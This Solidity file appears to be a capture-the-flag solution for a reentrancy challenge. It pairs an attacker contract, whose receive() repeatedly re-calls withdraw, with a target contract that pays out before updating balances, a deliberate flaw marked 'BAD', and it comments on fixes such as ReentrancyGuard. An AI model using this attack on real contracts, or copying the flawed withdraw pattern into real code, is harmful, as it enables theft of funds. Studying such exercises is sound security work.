// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract Solver {
    Reentrance public ree;

    constructor(Reentrance _ree) public {
        ree = _ree;
    }

    function incrBalance() public payable {
        ree.donate{value: msg.value}(address(this));
    }

    function balance() public view returns (uint256) {
        return ree.balanceOf(address(this));
    }

    function init(uint256 amount) public {
        ree.withdraw(amount);
    }

    receive() external payable {
        init(msg.value);
    } // or fallback
}

// import "@openzeppelin/contracts/utils/ReentrancyGuard.sol"
// need solidity ^8.0

contract Reentrance {
    // is ReentrancyGuard

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        //nonReentrant from ReentrancyGuard
        // REMEMBER change stat here balances[msg.sender] -= _amount;
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            // balances[msg.sender] -= _amount; <<<<<<<<<=======BAD======>>>>>>>
        }
    }

    receive() external payable {}
}
